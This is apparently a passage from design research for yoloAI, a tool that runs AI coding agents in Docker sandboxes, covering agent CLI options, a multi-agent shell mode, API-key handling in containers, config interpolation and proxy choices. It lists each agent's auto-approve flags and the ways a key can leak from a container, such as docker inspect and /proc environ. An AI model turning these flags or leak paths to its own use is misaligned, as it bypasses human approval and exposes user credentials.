- **Runtime:** Python 3.12+ (CLI); Docker (server mode)
- **Root restriction:** Permission issues if `~/.openhands` is root-owned
- **Docker quirks:** CLI mode needs no Docker; server mode requires Docker + has `host.docker.internal` resolution issues in DinD; sandbox startup ~15 seconds; 4GB RAM minimum
- **Sources:** [CLI installation](https://docs.openhands.dev/openhands/usage/cli/installation), [Troubleshooting](https://docs.openhands.dev/openhands/usage/troubleshooting/troubleshooting)

#### SWE-agent

- **Install:** `pip install -e .` from source + Docker for sandboxing
- **Headless command:** `sweagent run --agent.model.name=<model> --problem_statement.text="task"`
- **API key env vars:** `keys.cfg` file with `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, etc.
- **State dir:** `trajectories/` output directory
- **Model selection:** `--agent.model.name=<provider/model>` (LiteLLM format)
- **Sandbox bypass:** N/A (always headless, always sandboxed via Docker)
- **Runtime:** Python 3.10+ and Docker (required)
- **Root restriction:** N/A
- **Docker quirks:** Docker required for sandboxed execution; Docker-in-Docker fails (SWE-ReX hardcodes localhost); image builds can be brittle per-repo
- **Sources:** [SWE-agent GitHub](https://github.com/SWE-agent/SWE-agent), [Models and keys](https://swe-agent.com/latest/installation/keys/)

### Not Viable

| Agent | Reason |
|-------|--------|
| **Mentat** | Transitional (old Python CLI archived Jan 2025, new npm CLI at 0.1.0). No documented headless mode. |
| **GPT-Engineer** | Abandoned; team pivoted to Lovable (commercial SaaS). |
| **GPT-Pilot** | No headless mode (interactive by design). Docker setup broken (missing docker-compose.yml). |

### Cross-Agent Patterns

**What varies:**
1. Binary name and install method — no two agents are alike
2. Headless flag — `-p`, `exec --yolo`, `--message`, `run -t`, `-y`, `-p`, `-x`, `--headless -t`
3. API key env vars — each agent has its own naming convention
4. State/config directory — all different locations
5. Model selection — `--model`, `-m`, `--provider`+`--model`, auto-select, config-based
6. Sandbox bypass — `--dangerously-skip-permissions`, `--yolo`, `--yes-always`, `GOOSE_MODE=auto`, `-y`, `--dangerously-allow-all`
7. Runtime — Rust (static binary), Python (various versions), Node.js

**What's consistent:**
1. All accept a text prompt (positional arg, flag, or stdin)
2. All use environment variables for API keys
3. All have some concept of "auto-approve everything" for autonomous mode
4. All produce file changes in the working directory
5. None require a GUI
6. All work with git repos (some require it, some recommend it)

---

## Shell Mode: Pre-Installed Agents with Interactive Shell

**Idea:** Instead of launching a specific agent, yoloai could offer a mode that drops the user into a tmux shell inside the sandbox with all supported agents pre-installed and ready to use. The user picks which agent to run (or switches between them) interactively.

### Prior Art: pixels

**Repo:** [deevus/pixels](https://github.com/deevus/pixels)
**Language:** Go | **Status:** Active

**What it does:** Go CLI that provisions disposable Linux containers on TrueNAS SCALE via Incus, pre-loaded with multiple AI coding agents. Uses [mise](https://mise.jdx.dev/) (polyglot tool version manager) to install Claude Code, Codex, and OpenCode asynchronously via a background systemd service (`pixels-devtools`).

**Architecture:**
- Control plane: Go CLI communicating with TrueNAS via WebSocket API
- Compute: Incus containers (not Docker)
- Storage: ZFS datasets with snapshot-based checkpointing
- Networking: nftables rules for egress filtering (three modes: unrestricted, agent allowlist, custom allowlist)
- Access: SSH-based console (`pixels console`) and exec (`pixels exec`)

**Key workflow — checkpoint and clone:**
```
pixels create base --egress agent --console
pixels checkpoint create base --label ready
pixels create task1 --from base:ready
pixels create task2 --from base:ready
```

This creates a base container, saves a ZFS snapshot, then clones identical copies for parallel tasks. The checkpoint/clone pattern avoids re-provisioning.

**Agent provisioning pattern:**
- mise installs Node.js LTS, then Claude Code, Codex, OpenCode as npm/binary packages
- Installation runs asynchronously after container creation via systemd service
- Progress visible via `pixels exec mybox -- sudo journalctl -fu pixels-devtools`
- Provisioning can be skipped entirely (`--no-provision`) or dev tools skipped via config

**What's relevant to yoloai:**
1. **Multi-agent provisioning via mise** — mise handles Node.js, Python, Go, Rust, and arbitrary tools with a single `.mise.toml` config. This could replace yoloai's per-agent Dockerfile install logic with a unified tool manager.
2. **Shell-first workflow** — pixels doesn't auto-launch an agent. It drops you into a shell (via SSH) where all agents are available. You choose what to run.
3. **Blueprint for agent support** — pixels supports Claude Code, Codex, and OpenCode with a simple provisioning model. Its agent install patterns (npm globals, binary downloads) could inform yoloai's agent definitions.
4. **Checkpoint/clone for parallel work** — ZFS snapshots enable instant cloning. Analogous to yoloai's overlayfs plans but at the storage layer.

### How This Could Work in yoloai

**Minimal change:** A new `--shell` flag on `yoloai new` (or a `yoloai shell` command) that:
1. Creates a sandbox with all agents pre-installed (Claude Code, Codex, Aider, etc.)
2. Drops into tmux inside the container — no agent auto-launched
3. User runs agents manually, switches between them, uses standard CLI tools

**What changes vs. current design:**
- Current: one agent per sandbox, auto-launched in tmux
- Shell mode: all agents installed, user-driven, tmux session is a plain shell

**Provisioning approach options:**
1. **Fat base image** — pre-bake all agents into the Docker image. Slower build, faster create.
2. **mise-based** — install mise in base image, provision agents on first start (like pixels). Flexible but slower first start.
3. **Layered images** — base image + per-agent layers. User picks which layers to include.

**Open questions:**
- Should shell mode sandboxes still support `yoloai diff` / `yoloai apply`? (Probably yes — the copy/diff/apply workflow is orthogonal to how the agent is launched.)
- How to handle API keys for multiple agents? Currently one agent = one set of env vars. Shell mode needs all keys available.
- Should this replace the current agent-launch model or complement it? (Complement — the auto-launch model is better for scripting and CI.)

---

## Credential Management for Docker Containers

Research into secure approaches for passing API keys (primarily `ANTHROPIC_API_KEY`) into Docker containers. The current design passes keys as environment variables via `docker run -e`. This section evaluates the risks, alternatives, and what competitors actually do.

### 1. Risks of the Environment Variable Approach

Environment variables passed via `docker run -e` are exposed through multiple verified attack vectors:

**Verified exposure points:**

1. **`docker inspect`** — Any user with access to the Docker socket can run `docker inspect <container>` and see all environment variables in the `Config.Env` field, in plaintext. This is the most commonly cited risk. ([Docker official secrets docs](https://docs.docker.com/engine/swarm/secrets/), [Baeldung](https://www.baeldung.com/ops/docker-get-environment-variable))

2. **`/proc/<pid>/environ`** — Inside the container, the environment of PID 1 is readable at `/proc/1/environ` by any process running as the same user (or root). If a dependency has a code injection vulnerability, the attacker can read env vars directly from procfs. In unprivileged containers without `CAP_SYS_PTRACE`, access to other users' `/proc/<pid>/environ` is restricted, but same-user access is still available. ([moby/moby#6607](https://github.com/moby/moby/issues/6607))

3. **`docker logs --details`** — Some logging drivers add env vars to log output. The `--details` flag adds extra attributes including environment variables provided at container creation. ([Docker logs docs](https://docs.docker.com/reference/cli/docker/container/logs/))

4. **`docker commit`** — If someone runs `docker commit` on a running container, environment variables set via `docker run -e` are preserved in the committed image's metadata. Docker secrets explicitly protect against this. ([Docker secrets docs](https://docs.docker.com/engine/swarm/secrets/))

5. **Legacy `--link`** — The deprecated `--link` flag exposed all environment variables from the source container to the linked container. Starting with Docker v29.0, these variables are no longer set by default. Full removal planned for v30.0. ([Docker deprecated features](https://docs.docker.com/engine/deprecated/), [moby/moby#5169](https://github.com/moby/moby/issues/5169))

6. **Application logging** — Any application code that logs its environment (common in debugging) will include secrets. The CNCF recommends secrets be "immune to leaks via logs, audit, or system dumps." ([CyberArk](https://developer.cyberark.com/blog/environment-variables-dont-keep-secrets-best-practices-for-plugging-application-credential-leaks/))

7. **Image layers** — Secrets set via `ENV` in Dockerfiles persist in image layers and are recoverable via `docker history` or exported tarballs. This applies to build-time, not runtime `-e` flags, but is a common confusion point. ([Xygeni](https://xygeni.io/blog/dockerfile-secrets-why-layers-keep-your-sensitive-data-forever/))

**Risk assessment for yoloAI's threat model:**

- **docker inspect** — REAL risk. Anyone with Docker socket access (which yoloAI users inherently have) can see the key. Mitigated by the fact that the user is the one who provided the key in the first place — this is a self-exposure vector, not an escalation. The risk increases if a malicious process on the host enumerates Docker containers.
- **/proc/1/environ** — REAL risk inside the container. If Claude Code or any tool it installs has a vulnerability, the API key is trivially accessible. However, the AI agent already has the key to make API calls — the concern is more about exfiltration by a *different* compromised process in the same container.
- **docker logs** — LOW risk. Depends on logging driver configuration. Default json-file driver does not include env vars in log output unless `--details` is used.
- **docker commit** — LOW risk. Users are unlikely to commit running sandbox containers, but worth documenting.
- **--link** — NOT APPLICABLE. yoloAI doesn't link containers.

### 2. Docker Swarm Secrets

**How they work:**

Docker secrets are a Swarm-mode feature. The secret lifecycle:
1. Admin creates a secret via `docker secret create`, which sends it to a Swarm manager over mutual TLS.
2. The manager stores it encrypted in the Raft log, replicated across managers.
3. When a service with access to the secret starts a task, the decrypted secret is mounted into the container at `/run/secrets/<name>` on an in-memory filesystem (tmpfs on Linux).
4. The secret is never exposed as an environment variable. It cannot be captured by `docker inspect`, `docker commit`, or process listing.

**Can they work without Swarm?**

No. The [Docker documentation](https://docs.docker.com/engine/swarm/secrets/) explicitly states: "Docker secrets are only available to swarm services, not to standalone containers." The [moby/moby#33519](https://github.com/moby/moby/issues/33519) issue (filed 2017, closed as "completed") confirmed this is by design — the Swarm Raft log infrastructure is the backing store.

**Docker Compose workaround:**

Docker Compose provides a secrets mechanism that works without Swarm, but it is mechanically different. Compose mounts the secret file from the host filesystem as a bind mount into `/run/secrets/<name>` inside the container. This is NOT the same as Swarm secrets — there is no encryption at rest, no Raft log, no mutual TLS. It is a convenience feature that provides the same file-path API (`/run/secrets/`) so applications work identically in dev (Compose) and prod (Swarm). ([Docker Compose secrets docs](https://docs.docker.com/compose/how-tos/use-secrets/))

However, Compose secrets require Docker Compose. They cannot be used with plain `docker run`.

**Relevance to yoloAI:**

Not directly usable. yoloAI uses `docker run`, not Swarm services or Docker Compose. We would need to implement the same pattern ourselves (mount a file at `/run/secrets/`), which is the file-based injection approach covered in section 3.

**Platform notes:**
- Linux: secrets backed by tmpfs (in-memory, never hits disk).
- Windows: secrets persisted in cleartext to the container's root disk due to lack of a RAM disk driver. Explicitly removed when container stops. ([Docker secrets docs](https://docs.docker.com/engine/swarm/secrets/))
- Maximum secret size: 500 KB.

### 3. File-Based Credential Injection

**Pattern:** Write the API key to a file on the host, bind-mount it into the container (read-only), have the entrypoint read it, optionally export to an env var, then (optionally) delete/unmount.

**How it works mechanically:**

```bash
# Host side: write key to temp file
echo "$ANTHROPIC_API_KEY" > /tmp/yoloai-secret-$$
chmod 600 /tmp/yoloai-secret-$$

# Run container with bind mount
docker run --rm \
  -v /tmp/yoloai-secret-$$:/run/secrets/anthropic_api_key:ro \
  yoloai-sandbox

# Host side: clean up
rm /tmp/yoloai-secret-$$
```

Inside the container entrypoint:
```bash
export ANTHROPIC_API_KEY=$(cat /run/secrets/anthropic_api_key)
# Optionally: rm /run/secrets/anthropic_api_key (if not read-only mount)
exec "$@"
```

**What it protects against:**
- `docker inspect` — the key does NOT appear in `Config.Env` (it was never passed as `-e`).
- `docker commit` — the bind mount is not part of the container's writable layer.
- Image layers — nothing baked in.
- `docker logs` — no env var to leak to log drivers.

**What it does NOT protect against:**
- `/proc/1/environ` — once exported to an env var in the entrypoint, it is still in the process environment. The window is reduced (from container creation to entrypoint exec), but not eliminated.
- File on host disk — the temp file exists briefly on the host filesystem. Could be captured if the host is compromised during that window. Mitigatable with tmpfs (see section 5).
- Processes inside the container can still read the env var after export.

**Who uses this pattern:**
- Docker official images (MySQL, Postgres) support `*_FILE` env vars that read credentials from files. E.g., `MYSQL_ROOT_PASSWORD_FILE=/run/secrets/db_password`. ([Docker mysql image docs](https://github.com/docker-library/mysql/issues/88))
- Docker Compose secrets use this exact mechanism (bind mount to `/run/secrets/`).
- deva.sh mounts credential files read-only into containers.
- cco mounts extracted Keychain credentials as read-only temporary files.

**Cross-platform:** Works on Linux, macOS (Docker Desktop), Windows/WSL. No platform-specific concerns beyond the temp file location.

**Complexity:** Low. Requires a few lines in the entrypoint and cleanup logic on the host side.

**Production use:** Widely used. The `*_FILE` pattern is the Docker-recommended approach for official images.

### 4. Credential Proxy Approach (Docker Sandbox)

**How Docker Sandbox does it:**

Docker Sandbox (GA in Docker Desktop 4.50+) uses an HTTP/HTTPS filtering proxy that runs on the host at `host.docker.internal:3128`. The proxy performs two functions: network policy enforcement and credential injection. ([Docker Sandbox architecture](https://docs.docker.com/ai/sandboxes/architecture/))

**Mechanical details:**
1. The sandbox VM is configured to route all outbound HTTP/HTTPS traffic through the proxy.
2. The proxy acts as a MITM: it terminates TLS and re-encrypts with its own CA certificate. The sandbox trusts this CA.
3. When the proxy sees an outbound request to a known provider API (Anthropic, OpenAI, Google, GitHub), it injects the appropriate authentication header using credentials from the host's environment variables.
4. The agent inside the sandbox makes API calls without credentials — the proxy adds them transparently.
5. Credentials never enter the sandbox VM at all. They exist only on the host and in the proxy process.

**Bypass mode:** For applications that use certificate pinning or other techniques incompatible with MITM proxying, bypass mode tunnels traffic directly without inspection. Bypassed traffic loses credential injection and policy enforcement. ([Docker Sandbox network policies](https://docs.docker.com/ai/sandboxes/network-policies/))

**What it protects against:**
- ALL container-side exposure vectors: `docker inspect`, `/proc/environ`, `docker commit`, `docker logs`, application logging, compromised dependencies — the credential is never in the container at all.
- This is the strongest protection model of any approach researched.

**What it does NOT protect against:**
- Host compromise (credentials exist in host env vars and the proxy process).
- A compromised agent could theoretically make arbitrary API calls through the proxy (the proxy adds auth to any request matching the provider domain).
- Certificate-pinning applications won't work (must use bypass mode, losing protection).
- The proxy itself is an attack surface (MITM position).

**Cross-platform:**
- macOS: Full support via Docker Desktop's `virtualization.framework`.
- Windows: Via Hyper-V.
- Linux: Degraded — no microVM, container-based sandbox only.

**Complexity:** HIGH. Implementing a credential-injecting MITM proxy is a major undertaking. Docker builds this into Docker Desktop infrastructure. For yoloAI to replicate this, we would need:
- An HTTP/HTTPS proxy process running on the host (e.g., mitmproxy or a custom Go proxy).
- CA certificate generation and injection into the container's trust store.
- Provider-specific request matching and header injection logic.
- Proxy lifecycle management (start/stop with sandbox).
- Bypass configuration for incompatible applications.

**Production use:** Docker Sandbox is the only tool using this approach. It is production-quality but proprietary to Docker Desktop.

**Assessment for yoloAI:** The credential proxy is the gold standard for credential isolation, but the implementation cost is prohibitive for v1. Worth considering for a future version or as an optional advanced mode. The simpler file-based injection gets us 80% of the benefit at 10% of the cost.

### 5. tmpfs-Mounted Secrets

**How it works:**

Instead of bind-mounting a host file, create a tmpfs mount inside the container at a known path and write the secret there. The data exists only in RAM — never hits disk, on host or in container.

```bash
docker run --rm \
  --tmpfs /run/secrets:size=1m,mode=0700,uid=1000 \
  -e _INIT_SECRET_anthropic_api_key="$ANTHROPIC_API_KEY" \
  yoloai-sandbox
```

The entrypoint writes the env var to a file in the tmpfs, then unsets the env var:
```bash
echo "$_INIT_SECRET_anthropic_api_key" > /run/secrets/anthropic_api_key
unset _INIT_SECRET_anthropic_api_key
exec "$@"
```

**What it protects against:**
- Disk persistence — the secret never touches a filesystem backed by storage. On container stop, tmpfs contents vanish.
- `docker commit` — tmpfs mounts are not part of the container's writable layer.
- Image layers — nothing baked in.

**What it does NOT protect against:**
- The initial transport still uses an env var (`_INIT_SECRET_*`), which is visible in `docker inspect` and `/proc/1/environ` until the entrypoint unsets it. This is a window of vulnerability.
- Root inside the container can read `/run/secrets/` after the file is written.
- Swap — tmpfs data CAN be swapped to disk if the host is under memory pressure. This is a known caveat for security-critical deployments. ([Docker tmpfs docs](https://docs.docker.com/engine/storage/tmpfs/))

**Cross-platform:** Works on all platforms. tmpfs is a kernel feature available in Docker's Linux VM on macOS/Windows.

**Complexity:** Low. The `--tmpfs` flag is a standard Docker feature.

**Comparison to file-based mount:**
- tmpfs avoids leaving a temp file on the host disk (the bind-mount approach writes to host filesystem briefly).
- But the initial env var transport is actually *worse* than a file mount (file mount never puts the secret in an env var at all).
- Can be combined with file-based mount for best of both: create tmpfs inside container, then populate it via a bind-mounted file read in entrypoint.

**Production use:** Docker's own Swarm secrets use tmpfs-backed mounts at `/run/secrets/`. The pattern is well-established.

### 6. What Competitors Actually Do

#### deva.sh (thevibeworks/claude-code-yolo)

**Approach:** Multi-method credential handling.
- Supports `ANTHROPIC_API_KEY` as an env var passed via `docker run -e`.
- Also supports mounting credential *files* as read-only Docker volumes (e.g., `.claude/`, `.aws/`, `.config/gcloud/`, `.codex/auth.json`).
- Credentials mounted as `:ro` volumes cannot be modified by the container.
- Auth stripping: when `.codex/auth.json` is mounted, conflicting `OPENAI_*` env vars are stripped to prevent credential shadowing.
- Config priority chain: XDG config dirs → home dotfile → project-level → local override.

**Assessment:** Pragmatic approach. Uses env vars for API keys (simple) but mounts credential files read-only for OAuth and cloud provider auth. No tmpfs or proxy sophistication. ([thevibeworks/claude-code-yolo](https://github.com/thevibeworks/claude-code-yolo))

#### Docker Sandbox

**Approach:** Credential proxy (see section 4). Credentials never enter the sandbox VM. The MITM proxy on the host injects auth headers into API requests transparently. The strongest credential isolation of any tool surveyed. However, users report OAuth authentication broken for Pro/Max plans ([docker/for-mac#7842](https://github.com/docker/for-mac/issues/7842)) and credentials lost on sandbox removal ([docker/for-mac#7827](https://github.com/docker/for-mac/issues/7827)).

#### cco (nikvdp/cco)

**Approach:** Platform-specific credential extraction + runtime mounting.
- On macOS: automatically extracts Claude Code credentials from macOS Keychain using `security find-generic-password`.
- On Linux: reads credentials from config files.
- Credentials are written to a temporary location, mounted read-only into the container at runtime, and cleaned up after the session.
- Credentials are never baked into Docker images.
- Cross-platform: macOS Keychain, Linux files, env vars — auto-detected.

**Assessment:** Smart Keychain integration for macOS. The "extract from OS credential store → temp file → mount → cleanup" pattern is a reasonable middle ground. ([nikvdp/cco](https://github.com/nikvdp/cco))

#### Anthropic sandbox-runtime

**Approach:** Environment inheritance with filesystem restrictions.
- The sandboxed process inherits its parent's environment (including `ANTHROPIC_API_KEY`).
- Security comes from filesystem restrictions (deny read access to `~/.ssh`, `~/.aws`, etc.) and network restrictions (domain allowlisting), not from credential isolation.
- No explicit credential filtering or sanitization.
- The tool focuses on preventing the agent from accessing *other* credentials on the system, not on protecting the API key that the agent needs.

**Assessment:** Does not attempt to solve credential isolation. The API key is in the environment, same as a plain `docker run -e`. Security posture relies on the sandbox preventing *lateral* credential access (SSH keys, cloud creds). ([anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime))

#### Trail of Bits devcontainer

**Approach:** Filesystem isolation with controlled mounts.
- The container has no access to host filesystem, SSH keys, or cloud credentials by default.
- Host `~/.gitconfig` is mounted read-only for git identity.
- Additional credential files can be mounted on demand via `devc mount ~/secrets /secrets --readonly`.
- No automated credential extraction or proxy.

**Assessment:** Conservative security-first approach. Credentials require explicit opt-in mounting. No special credential handling — relies on standard Docker volume mounts. ([trailofbits/claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer))

#### claude-code-sandbox (TextCortex, archived)

**Approach:** Credential management was the #1 reported pain point.
- Issues #17 and #14 both related to credentials not reaching the container.
- Auto-extracted macOS Keychain credentials.
- Was archived before the credential issues were resolved.

**Assessment:** Cautionary tale. Credential handling in containers is genuinely hard — this project died partly because they couldn't get it right cross-platform.

### 7. BuildKit Secrets

**How they work:**

The `RUN --mount=type=secret` Dockerfile instruction makes a secret available during a single `RUN` instruction without writing it to any image layer. ([Docker BuildKit secrets docs](https://docs.docker.com/build/building/secrets/))

```dockerfile
# syntax=docker/dockerfile:1
RUN --mount=type=secret,id=mytoken \
    TOKEN=$(cat /run/secrets/mytoken) && \
    curl -H "Authorization: Bearer $TOKEN" https://api.example.com/setup
```

Build invocation:
```bash
docker build --secret id=mytoken,src=./token.txt .
```

**Key properties:**
- Secret is available only during the RUN instruction that mounts it.
- It is mounted at `/run/secrets/<id>` by default (customizable via `target=`).
- NOT persisted in any image layer — `docker history` shows nothing.
- Source can be a file or environment variable (`type=file` or `type=env`).
- Maximum size: 500 KB.

**Relevance to yoloAI:**

BuildKit secrets are for *build time*, not *run time*. They are relevant when building profile base images that need to pull from private registries or install licensed tools. They are NOT relevant for passing `ANTHROPIC_API_KEY` to running containers.

yoloAI's profile system (`~/.yoloai/profiles/<name>/Dockerfile`) supports BuildKit secrets for handling private dependencies during `docker build`, protecting credentials from leaking into built images (see [commands.md](../design/commands.md) `yoloai build` section).

**Cross-platform:** Works everywhere BuildKit works (Docker 18.09+, enabled by default in Docker Desktop and recent Docker Engine).

### 8. Best Practices from Standards Bodies

#### OWASP Docker Security Cheat Sheet

**RULE #12 — Utilize Docker Secrets for Sensitive Data Management:**
Recommends Docker Secrets as the primary mechanism. Secrets are stored separately from container configurations, reducing accidental exposure. For non-Swarm environments, the guidance is to use equivalent file-mounting patterns. ([OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html))

**OWASP Secrets Management Cheat Sheet:**
Recommends regular secret rotation so stolen credentials have limited lifetime. Recommends secrets be injected at runtime, never stored in images or code. ([OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html))

#### CIS Docker Benchmark

- Using `ENV` in Dockerfiles to store secrets exposes them in image layers; extractable via `docker save` or tools like Dive/TruffleHog. ([CIS Docker Benchmark summary](https://www.aquasec.com/cloud-native-academy/docker-container/docker-cis-benchmark/))
- Secrets should be injected at runtime, not hardcoded in images.
- File-mounting secrets is preferred over environment variables.
- Applications commonly log their environment, which will include env var secrets.

#### CNCF Guidance

The Cloud Native Computing Foundation recommends that "secrets should be injected at runtime within the workloads through non-persistent mechanisms that are immune to leaks via logs, audit, or system dumps (i.e., in-memory shared volumes instead of environment variables)."

### Summary and Design Approach

**Approach comparison:**

| Approach | docker inspect | /proc/environ | docker commit | Disk persistence | Complexity | Cross-platform |
|----------|---------------|---------------|---------------|-----------------|------------|----------------|
| Env var (`-e`) | EXPOSED | EXPOSED | EXPOSED | No | Trivial | All |
| File bind mount (`:ro`) | Hidden | Hidden (until entrypoint exports) | Hidden | Brief (host temp file) | Low | All |
| tmpfs + env var init | EXPOSED (briefly) | EXPOSED (until unset) | Hidden | No (RAM only) | Low | All |
| File on tmpfs (combined) | Hidden | Hidden (until export) | Hidden | No | Low-Medium | All |
| Credential proxy | Hidden | N/A (never in container) | N/A | No | Very High | Partial |
| Docker Swarm secrets | Hidden | Hidden | Hidden | No (tmpfs) | N/A (requires Swarm) | All |

**Approach adopted for yoloAI v1:**

**File-based injection via bind mount to tmpfs**, combining sections 3 and 5:

1. yoloAI creates a tmpfs directory on the host (Linux: native tmpfs; macOS/Windows: a temp file with immediate cleanup after container start).
2. API key is written to a file in this directory.
3. The file is bind-mounted read-only into the container at `/run/secrets/anthropic_api_key`.
4. The container entrypoint reads the file, exports to env var (since Claude Code and other agents expect `ANTHROPIC_API_KEY` in the environment), then the agent runs.
5. The host-side temp file is cleaned up immediately after container start.

**Tradeoffs accepted:**
- The agent process will have the API key in its environment (unavoidable — agents expect env vars). This means `/proc/<pid>/environ` exposes it to same-user processes inside the container.
- This is acceptable because the AI agent already has full use of the key (it makes API calls). The threat we're mitigating is accidental or unnecessary exposure, not preventing the agent from having the key.

**What this protects:**
- `docker inspect` does NOT show the key.
- `docker commit` does NOT capture the key.
- `docker logs` does NOT leak the key.
- No temp file lingers on host disk (tmpfs or immediate cleanup).
- Image layers never contain the key.

**Future considerations:**
- Credential proxy (Docker Sandbox approach) could be added as an advanced option in a later version.
- If agents add support for reading API keys from files (e.g., `ANTHROPIC_API_KEY_FILE`), we can skip the env var export entirely and get even stronger isolation.
- macOS Keychain integration (cco's approach) could be added as a credential source option.
- BuildKit secrets are supported for profile Dockerfile builds that need private dependencies (see [commands.md](../design/commands.md) `yoloai build` section).

---

## Environment Variable Interpolation in Config Files

Research into whether config files should support `${VAR}` environment variable interpolation, based on how other tools handle this and user sentiment.

### User Demand When Interpolation Is Absent

Demand is consistently high across the infrastructure tooling ecosystem:

- **Prometheus (#2357):** One of the most controversial decisions in the project. The maintainer's rejection received **149 thumbs-down reactions**. Users cited keeping secrets out of config files, simplifying containerized deployments, and twelve-factor app methodology.
- **Helm (#10026):** 138 thumbs-up. Open since August 2021, still unresolved. Users describe maintaining separate `values.yaml` per environment as "daunting." Helm maintainers raised a security concern: malicious chart authors could exfiltrate sensitive env vars from users' machines.
- **Kustomize (#775, #388):** Explicitly rejects env var substitution as an "eschewed feature." Users resort to piping through `envsubst`: `kustomize build . | envsubst | kubectl apply -f -`.
- **Viper (#418):** Go config library. Closed as wontfix — maintainers prefer `BindEnv`/`AutomaticEnv` at the API level over in-file interpolation.
- **Nginx:** No native support. Spawned an entire ecosystem of `envsubst` workarounds with its own pitfall: `envsubst` replaces Nginx's built-in `$host`, `$connection` etc. The common hack is exporting `DOLLAR="$"` and using `${DOLLAR}` in templates.

The `envsubst` pipe pattern is so pervasive it has dedicated blog posts, tutorials, and purpose-built kubectl plugins.

### User Pain When Interpolation Is Present

Every tool that implements interpolation acquires a long tail of escaping bugs, silent data corruption, and confused users.

**Docker Compose — the canonical cautionary tale:**

- **Passwords with `$` silently truncate.** A password like `MyP@ssw0rd$Example$123` has `$Example` replaced with empty string. No error — users get a wrong password and debug authentication failures for hours.
- **The `$$` escape broke in v2.29.0** ([docker/compose#12005](https://github.com/docker/compose/issues/12005)). Working Compose files suddenly needed `$$$$` instead of `$$`. Users: "Wild that this has been open for so long, and now out of nowhere we need four dollar signs."
- **Regex patterns break.** `^/(sys|proc|dev|host|etc)($|/)` produces `Invalid interpolation format` ([docker/compose#4485](https://github.com/docker/compose/issues/4485)).
- **4 confusing "env" concepts.** `.env`, `--env-file`, `env_file:`, and `environment:` all use the term "env" but do different things. The first two affect interpolation; the last two affect the container. Users constantly conflate them.

**Other tools:**

- **Vector (#17343):** Performs substitution BEFORE YAML parsing. Passwords starting with `\C` or `>` break YAML parsing entirely. Standard YAML escaping doesn't help because substitution happens before quotes are interpreted.
- **OpenTelemetry (#3914):** Maintainers found interpolation "diverges so much from YAML it requires a dedicated parser" and "increases exposure to security bugs." The `$$` escape and YAML's own escape sequences interact badly.
- **Cross-tool `$` problem:** Komodo (#559), ddev (#3355), CircleCI, django-environ (#271) all have dollar-sign escaping issues. Passwords are the #1 victim.

**The primary footgun:** `$` in values silently interpreted as variable references. Users don't get errors — they get wrong values and spend hours debugging.

### Middle-Ground Approaches

| Tool | Approach | Tradeoff |
|------|----------|----------|
| **Spring Boot** | Any config key overridable by env var with matching name (uppercased, dots→underscores). No in-file syntax needed. | Cleanest for "override per environment" but requires framework support. |
| **Viper (Go)** | `BindEnv`/`AutomaticEnv` at API level. Rejected in-file interpolation. | Config files stay static and readable. Override happens in code. |
| **BOSH** | Uses `(())` syntax instead of `${}`. Variables can come from files, env vars, or a variable store. | Avoids `$` collision entirely. Unfamiliar syntax. |
| **OTel** | Interpolation restricted to **scalar values only** — mapping keys cannot be substituted. `${ENV:-default}` supported. | Limits blast radius. Still has `$` escaping issues. |
| **Redpanda Connect** | `${VAR}` everywhere, but fields marked "secret" in schema get automatic scrubbing during config export. `--secrets` flag enables vault lookup at runtime. | Field-level awareness. Secrets outside designated fields aren't scrubbed. |
| **SOPS** | Encrypt specific values in-place using age/PGP keys. Config structure remains readable; secret values are ciphertext. | Avoids interpolation entirely. Decryption at deploy time. |

### Summary

| Dimension | Finding |
|-----------|---------|
| Demand when absent | Very high. Users are vocal and persistent. `envsubst` workaround is universal. |
| Pain when present | Significant when bare `$VAR` is supported. Silent data corruption from `$` in passwords. Escaping breaks across versions. Confusing semantics. Braced-only `${VAR}` eliminates most of this — bare `$` is left alone. |
| Primary use case | Secrets (API keys, auth tokens) and per-environment overrides (ports, hostnames). |
| Primary footgun | Bare `$VAR` syntax: `$` in values silently interpreted as variable references — wrong values, no errors. Braced-only `${VAR}` reduces the collision surface to literal `${` sequences, which are extremely rare in practice. |
| Pre-parse vs post-parse | Pre-YAML substitution is fragile (Vector, Loki). Post-parse is safer but more complex. |
| Best middle grounds | Spring Boot / Viper (override at API level, no in-file syntax), BOSH (`(())` avoids `$` collision), OTel (scalar-only restriction). Braced-only `${VAR}` + post-parse + fail-fast is a simpler alternative that addresses the same concerns. |
| Security concern | Helm maintainers: interpolation can enable exfiltration of env vars by malicious config authors. |

### Implications for yoloAI

yoloAI's design decisions based on this research:

1. **Braced-only syntax:** Only `${VAR}` is recognized. Bare `$VAR` is treated as literal text. This eliminates the primary footgun — passwords like `p4ssw0rd$5`, regex patterns like `($|/)`, and other `$`-containing strings are safe. The only collision possible is a literal `${` sequence in a value (e.g., `p4ssw${rd}`), which is extremely rare in practice.
2. **Post-parse interpolation:** Interpolation runs after YAML parsing, so expanded values cannot break YAML syntax (avoiding the Vector/Loki class of bugs where substituted values containing `:`, `#`, `{` etc. corrupt the parse).
3. **Fail-fast on unset variables:** Unset variables produce an error at sandbox creation time, avoiding Docker Compose's worst bug (silent empty-string substitution).
4. **Broad scope:** Interpolation applies to all config values. The braced-only restriction makes this safe enough for v1. Revisit with field-level scoping if users report issues.

---

## Proxy Sidecar Research

Evaluation of forward proxy options for yoloAI's `--network-isolated` sidecar. Requirements: HTTPS CONNECT tunneling with domain allowlist (no MITM), lightweight (runs per sandbox), configurable allowlist, logging.

### Options Evaluated

| Criterion                | Tinyproxy        | Squid          | Nginx+Module   | mitmproxy  | Go Custom       |
|--------------------------|------------------|----------------|----------------|------------|-----------------|
| CONNECT domain allowlist | Yes              | Yes            | Yes (awkward)  | Partial    | Yes             |
| Image size (compressed)  | ~3 MB            | ~8-18 MB       | ~49 MB         | ~150+ MB   | ~5-10 MB        |
| Memory (idle)            | ~2-3 MB          | ~20-50 MB      | ~5-10 MB       | ~50+ MB    | ~5-10 MB        |
| Config reload            | SIGUSR1          | squid -k reconf| nginx -s reload| Script     | Full control    |
| Actively maintained      | Minimal          | Yes            | Third-party    | Yes        | Self-maintained |
| Security track record    | CVEs unfixed     | Good           | N/A            | Good       | Self-maintained |
| Implementation effort    | Config only      | Config only    | Config + build | Config     | ~200-300 lines  |

### Tinyproxy — functional but security concerns

